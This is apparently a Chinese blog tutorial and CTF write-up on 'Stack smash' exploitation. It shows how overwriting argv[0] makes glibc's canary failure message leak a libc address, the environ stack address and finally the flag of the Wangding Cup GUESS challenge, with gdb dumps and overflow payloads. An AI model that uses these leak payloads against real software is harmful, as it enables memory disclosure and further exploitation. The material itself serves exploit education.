---
title: 栈溢出 Stack smash 利用
tags:
  - Stack smash
categories: Exploit
keywords:
  - Stack smash
translate_title: stack-overflow-smash-utilization
date: 2018-10-13 19:40:28
---

在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。

# 0x01利用思路
## 1. Stack smash
Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：
>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.

下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 `__stack_chk_fail` 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 `-fno-stack-protector` 选项关闭该机制。
```python
    Low Address |                 |
                +-----------------+
        esp =>  | local variables |
                +-----------------+
                |    buf[0-3]     |
                +-----------------+
                |    buf[4-7]     |
                +-----------------+
                |     canary      |
                +-----------------+
        ebp =>  |     old ebp     |
                +-----------------+
                |   return addr   |
                +-----------------+
                |      args       |
                +-----------------+
   High Address |                 |
```
libc 中 `__stack_chk_fail` 的源码如下，该函数调用 `__fortify_fail` 输出异常信息，其中包含  libc_argv[0] 指向的程序名。
```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminatedn",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```
若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。

## 2. environ
在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，**可通过 environ 指针泄露栈地址**。
```python
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess
0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess
0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
gdb-peda$ print environ
$1 = (char **) 0x7fffffffdc98
gdb-peda$ telescope 0x7fffffffdc98
0000| 0x7fffffffdc98 --> 0x7fffffffe0ae ("XDG_SESSION_ID=c2")
0008| 0x7fffffffdca0 --> 0x7fffffffe0c0 ("QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1")
0016| 0x7fffffffdca8 --> 0x7fffffffe0e3 ("UNITY_DEFAULT_PROFILE=unity")
0024| 0x7fffffffdcb0 --> 0x7fffffffe0ff ("GNOME_KEYRING_PID=")
0032| 0x7fffffffdcb8 --> 0x7fffffffe112 ("GNOME_KEYRING_CONTROL=")
0040| 0x7fffffffdcc0 --> 0x7fffffffe129 ("DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path")
0048| 0x7fffffffdcc8 --> 0x7fffffffe15c ("LOGNAME=lc")
0056| 0x7fffffffdcd0 --> 0x7fffffffe167 ("INSTANCE=")
```

# 0x02 实例分析
下面通过调试 [网鼎杯的 pwn-GUESS](https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash) 的利用过程说明 Stack smash 利用方法。
## 1. 漏洞位置
程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  ...
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( v6 >= v7 )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    v5 = sub_400A11();
    if ( !v5 )
      break;
    ++v6;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(&s2);         // overflow
  if ( !strcmp(&buf, &s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```

## 2. 漏洞利用
首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。
```python
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：
- 通过栈溢出漏洞覆盖 argv[0] 为 `__libc_start_main` 的 got 表项，触发 Stack smash 可泄露 `__libc_start_main` 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；
- 计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 `environ` ，泄露出 environ 的值，即指向环境变量的栈地址；
- 根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。

### 1）泄露 libc 基址
首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。
```python
[-------------------------------------code-------------------------------------]
   0x400b1b:    mov    rdi,rax
   0x400b1e:    mov    eax,0x0
   0x400b23:    call   0x400830 <gets@plt>
=> 0x400b28:    lea    rdx,[rbp-0x40]
   0x400b2c:    lea    rax,[rbp-0x70]
   0x400b30:    mov    rsi,rdx
   0x400b33:    mov    rdi,rax
   0x400b36:    call   0x400820 <strcmp@plt>
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400b28 in ?? ()
gdb-peda$ stack 20
0000| 0x7fffffffdb00 --> 0x7fffffffdc88 --> 0x7fffffffe091 ("/home/lc/Desktop/guess/guess")
0008| 0x7fffffffdb08 --> 0x100000000 
0016| 0x7fffffffdb10 --> 0x0 
0024| 0x7fffffffdb18 --> 0x3 
0032| 0x7fffffffdb20 --> 0x0 
0040| 0x7fffffffdb28 --> 0x3 
0048| 0x7fffffffdb30 ("flag{43861991f7e943090e257863eec75961}\n")
0056| 0x7fffffffdb38 ("61991f7e943090e257863eec75961}\n")
0064| 0x7fffffffdb40 ("943090e257863eec75961}\n")
0072| 0x7fffffffdb48 ("57863eec75961}\n")
0080| 0x7fffffffdb50 --> 0xa7d3136393537 ('75961}\n')
0088| 0x7fffffffdb58 --> 0x0 
0096| 0x7fffffffdb60 ('A' <repeats 16 times>)
0104| 0x7fffffffdb68 ("AAAAAAAA")
0112| 0x7fffffffdb70 --> 0x0 
```
因此可构造以下 payload 将 argv[0] 覆盖为 `__libc_start_main` 的 got 表项，可泄露出 `__libc_start_main` 函数在内存中的地址，从而计算出 libc 的基址。
```python
payload = 'A' * 0x128 + p64(libc_start_main_got)
libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
```
泄露出 libc 基址为 0x7ffff7a0d000。
```python
[DEBUG] Received 0x7a bytes:
    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │
    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│
    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│
    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│
    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│
    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│
    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│
    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│
    0000007a
libc_base_addr = 0x7ffff7a0d000
```

### 2）泄露 environ
构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 `environ` 的地址，从而泄露出 `environ` 的值，该值为执行环境变量的栈地址。
```python
environ_addr = libc_base_addr + libc.symbols['_environ']
payload1 = 'A' * 0x128 + p64(environ_addr)
```
泄露出 `environ` 的值为 0x7fffffffdcf8。
```python
[DEBUG] Received 0x7a bytes:
    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │
    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│
    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│
    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│
    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│
    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│
    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│
    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│
    0000007a
stack_addr = 0x7fffffffdcf8
```
可在 gdb 中验证该值为正确的。
```python
gdb-peda$ print environ
$1 = (char **) 0x7fffffffdcf8
gdb-peda$ telescope 0x7fffffffdcf8
0000| 0x7fffffffdcf8 --> 0x7fffffffe0ea ("INSTANCE=")
0008| 0x7fffffffdd00 --> 0x7fffffffe0f4 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")
0016| 0x7fffffffdd08 --> 0x7fffffffe12a ("ALL_PROXY=socks://192.168.239.1:1080/")
       ...
```

### 3）读取 flag
查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。
```python
gdb-peda$ stack 20                                                                                                                                             
0000| 0x7fffffffdb08 --> 0x7ffff7a875e8 (<_IO_new_file_underflow+328>:  cmp    rax,0x0)
0008| 0x7fffffffdb10 --> 0x7ffff7dd3780 --> 0x0 
     ...
0088| 0x7fffffffdb60 --> 0x7fffffffdce8 --> 0x7fffffffe0e2 --> 0x73736575672f2e ('./guess')
0096| 0x7fffffffdb68 --> 0x100000000 
0104| 0x7fffffffdb70 --> 0x8600000000 
0112| 0x7fffffffdb78 --> 0x3 
0120| 0x7fffffffdb80 --> 0x2 
0128| 0x7fffffffdb88 --> 0x3 
0136| 0x7fffffffdb90 ("flag{43861991f7e943090e257863eec75961}\n")
     ...
```
构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。
```python
payload2 = 'A' * 0x128 + p64(stack_addr - 0x168)
```
最终获取 flag 如下：
```python
[DEBUG] Received 0x9b bytes:
    'You should take more effort to get six sence, and one more challenge!!\n'
    '*** stack smashing detected ***: flag{43861991f7e943090e257863eec75961}\n'
    ' terminated\n'
You should take more effort to get six sence, and one more challenge!!
*** stack smashing detected ***: flag{43861991f7e943090e257863eec75961}
 terminated
```
____
References:   
[1] [浅析ROP之Stack Smash](https://www.anquanke.com/post/id/161142#h2-0)   
[2] [Environ](http://tacxingxing.com/2017/12/16/environ/)
